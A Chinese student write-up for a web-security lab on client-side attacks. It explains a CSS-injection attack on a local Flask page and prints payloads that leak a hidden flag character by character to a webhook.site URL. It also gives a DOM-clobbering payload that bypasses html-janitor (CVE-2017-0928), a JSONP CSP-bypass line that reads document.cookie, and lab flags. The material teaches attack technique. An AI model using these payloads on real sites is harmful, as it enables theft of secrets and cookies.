# Web Lab 2：用户侧攻击

---

# Task 1: HTML Parser (15 分 )
1.  这题要求以层序遍历的方式解析一个html文件，其实主要是考察对于解析工具的使用。
2.  我这里使用了Beautiful Soup，lxml，以及队列来快速处理层序遍历。
3.  先用队列形式，最后用逗号join成字符串之后再用题目给的代码，用hashlib转md5。
4.  flag:`AAA{0e6451a90a50ea7a8b1719b7dbcf6dac}`

---

# Task 2: Show me the secret (20 分 )
1.  这道题是一个css注入的本地实现，先解释一下题目给的情景。
    1.  这里使用了flask框架，~~我们知道flask框架的debug=true会发生很奇怪的事~~。
    2.  框架内规定了三个路由：index victim 和 inject，后面两个给了html，随便补了一个index。
    3.  观察这个victim页面，首先需要127.0.0.1才能访问，渲染的时候会把victim.html里面input块的value替换成真正的flag；此外还有一个css渲染的位置，直接读取本地的custom.css。
    4.  这个inject页面有一个post提交的入口，会把提交的内容直接保存到custom.css，那这就是注入点的位置了。
    5.  所以管理员每次登录`/victim`的时候都会渲染一次html，然后调用css里的代码，这样就能类似布尔盲注的一位一位读出flag。
2.  但可惜我没有服务器，内网穿透有点麻烦，所以这里我是用了webhook开了一个公网ip给我用，在payload里面`background-img`里面就放上这个webhook的url，就能收到victim发来的请求。
3.  既然flag放在input里面，name = “secret”，所以我尝试模仿ppt构造如下的语句。
4.  `input[name="secret"][value^="A"] { background-image: url("https://webhook.site/7aa20480-9424-4214-bb23-99ffe7e0a1d/?data=A"); }`
5.  但是发现这个语句很难向我的webhook发送请求，极少数情况有成功过，belike:
    ![Webhook收到的请求](c1.png)
6.  原因可能是出在这个hidden块，搜索结果是：现代主流浏览器（如 Chrome、Firefox）出于性能和安全优化，通常不会为一个 `type="hidden"` 的输入框或任何被设置为 `display: none;` 的元素加载 `background-image`。
7.  所以我换了一种注入方法，是使用了`has()`块，这是一个父选择器，语法类似`body:has(input[name="secret"][value^="A"])`，意思是选择body元素，前提是内部包含了一个name 是 secret的且第一位为A的input元素，然后我们就可以给这个body块“加背景”（其实就是注入我们的url）。
8.  具体语法如下：
9.  `body:has(input[name="secret"][value^="A"]) {background-image: url(https://webhook.site/7aa20480-9424-4214-bb23-99ffe7e0a1d8/?found=A);}`
10. OK！这个payload百试百灵。
    ![新payload成功](c4.png)
11. 本地测试的具体流程是：inject页面注入payload，进victim页面刷新浏览器，然后就可以在webhook的统计页面看到我们的请求啦！
12. 这样就确认了前三位是AAA，同理，接下来尝试后面的就可以拿到整个flag。
13. 既然这样就可以开始写脚本了,既然本地不好模拟浏览器的渲染css，那就主要体现一下攻击的过程。
14. 由于我使用的是webhook的监听，所以我这里的操作是打开脚本，然后自动发送payload，然后进入victim页面刷新一下，然后等待webhook收到，再在对话框敲入刚收到的，之后继续这个过程。
15. 看一下custom.css：
    ![custom.css文件内容](c6.png)
16. 所以交互的过程就长这样：
    ![脚本交互过程](c3.png)
17. 在webhook里面长这样：
    ![Webhook中收到的请求](c5.png)
18. 代码提交为task2.py。

---

# Task 3: node.\_sanitized (30 分 )
搜索并简要解释 CVE-2017-0928 的原理
1.  回顾一下DOM Clobbering，这是一种前端攻击技巧，他是建立在一个特性上，即：当你在 HTML 中创建带有 id 或 name 属性的元素时，浏览器会自动在 `window` 或 `document` 对象上创建同名的全局 JavaScript 变量，其值指向该 DOM 元素。
2.  比如说ppt里面那个`AAA 喵~`的代码就是DOM操作，先用`getElementById`选择id=target的html元素，然后再新建`<span>`的内容修改target。
3.  DOM Clobbering就是基于某些 HTML 元素的 `id` 或 `name` 属性会自动在 `window` 对象上创建同名的全局变量，通过 `id` 或 `name` 属性来“篡改”或“覆盖”应用程序中已经存在的 JavaScript 全局变量或对象属性。这会导致程序的逻辑被意外改变，从而绕过安全限制或执行非预期的操作。
4.  CVE-2017-0928受影响对象是一个名为 `html-janitor` 的 JavaScript 库，这是一个html的过滤器，处理一些可能的恶意注入的代码来保持html的纯净，比如移除`<script>`之类的。
5.  那么这个`html-janitor`在在清理 HTML 时，会遍历 DOM 树的每一个节点，如果一个节点已经被处理过了，就给它打上一个`node._sanitized = true`的标记，下次再遇到就直接跳过。
6.  但是，`node._sanitized`只是一个普通的js属性，可以通过 DOM Clobbering 被覆盖。
7.  所以攻击者只需要在构造的html里面让 `if (node._sanitized)` 这个判断条件意外地为 `true` 就可以了，攻击的核心如下：
    1.  Payload:`<form><object name="_sanitized"></object></form>`
    2.  html-janitor开始处理这个html代码的时候，先访问到form元素，此时`node`指向这个form，开始执行`if (node._sanitized)` 的判断。
    3.  由于`node`是`<form>`元素，所以就起到了DOM Clobbering的效果，即`node._sanitized` 实际上是在访问 `<form>` 元素的一个名为`_sanitized` 的子元素,又正好有一个子元素的 `name` 是 `_sanitized`。
    4.  因此，`node._sanitized` 的值就变成了这个 `<object>` 对象，而对象在判断里是true，就对html-janitor进行了一个绕过，之后只需要在form里面放上我们需要的注入代码就行。

---


# Task 7: 拓展 (20 分 )
1.  自行搜索并学习中间人攻击, 解释为什么我们要避免连接公共 Wifi ( 如饭馆 , 咖啡厅 )
    1.  根据维基百科，中间人攻击就是通讯的两端认为他们正在通过一个私密的连接与对方直接对话，事实上整个会话都被攻击者（中间人）完全控制，攻击者可以拦截通讯双方的通话并插入新的内容。
    2.  举一个非对称加密的例子：比如A和B进行通话，而C可以拦截A发给B的公钥，改为发送自己的公钥，也可以拦截B发给A的公钥，这样子在下一次交换的时候，由于A与B都认为这个公钥就是对方的，而利用这个公钥加密信息，导致被C截获，C甚至可以篡改这个信息，并用刚刚得到的公钥再进行加密。
    3.  中间人攻击的技术有很多种，比如ARP欺骗，这一般出现在连接路由器的局域网内，ARP协议是把IP地址翻译成MAC物理地址的协议，攻击者可以通过向用户的设备和路由器发起攻击，进而充当中间人的身份，获得两者沟通的所有信息。
    4.  此外还有DNS欺骗，攻击者可以截获DNS解析请求，比如修改到一个近似的网站上，诱导用户输入隐私信息；WiFi欺骗：在公共场所的类似wifi名字，比如KFC-Free-Wifi和KFC\_Free\_Wifi，如果错连的话，那么数据就会经过攻击者再被转发。
    5.  所以我们就要避免连接公共Wifi，原因之一就是我们无法判断这个wifi是官方提供的安全wifi还是攻击者建立的；此外，免费的公共wifi与设备之间传输的数据往往是未加密的，容易被同一局域网下的用户给捕获。
    6.  一旦被中间人攻击之后，我们的隐私数据就变得透明，攻击者可以轻易获取登录凭证、监控网络活动或者注入恶意内容。
2.  自行搜索并学习课上提到的CSP 策略, 解释为什么 CSP 可以防止 XSS 攻击 , 并构造一个配置不当的 CSP 被绕过的例子 ( 不需要给出代码实现 , 只需要描述 )
    1.  CSP是一个额外的安全层，用于过滤特定攻击比如XSS攻击，以下是可以防止XSS攻击的原因：
        1.  XSS 攻击利用了浏览器对于从服务器所获取的内容的信任,CSP 通过指定有效域,即浏览器认可的可执行脚本的有效来源,让服务器能过滤一些XSS攻击的载体文件，一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本，始终不允许执行脚本的站点可以选择全面禁止脚本执行。
        2.  除此之外，服务器还可指明哪种协议允许使用，比如全部指定HTTPS协议。
    2.  一个配置不当的例子：过于宽泛地使用白名单，允许不安全的JSONP端点。
        1.  比如说某个网站使用了`Content-Security-Policy: script-src 'self' https://trusted-web.com`, 然后这个`trusted-src`网站有一个提供JSONP服务的API端点，这里会创建一个 `<script>` 标签来加载一个远程URL，这个url会返回一段json数据：`fun({"data":"value"})`。
        2.  所以，如果这个api没有经过严格的过滤，攻击者就会在这里注入js代码，比如：
        3.  `<script src="https://trusted-web.com/api/data?callback=alert(document.cookie)//"></script>`
        4.  由于`trusted-web`是被允许的，那么浏览器就会往这里发请求，返回callback参数的值:
        5.  `alert(document.cookie)//({"data": "value"})`那么这里的数据就被注释了，而前面的参数就成了js代码被执行，可以窃取cookie。
        6.  因此，尽量避免使用过于宽泛的域名作为白名单，应指定到具体的脚本路径。